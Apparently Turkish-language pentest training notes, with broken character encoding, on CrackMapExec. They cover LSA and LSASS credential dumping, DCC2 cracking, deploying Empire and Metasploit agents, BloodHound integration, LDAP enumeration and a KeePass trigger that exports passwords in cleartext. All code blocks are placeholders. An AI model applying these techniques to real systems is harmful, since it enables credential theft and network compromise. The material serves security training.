`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

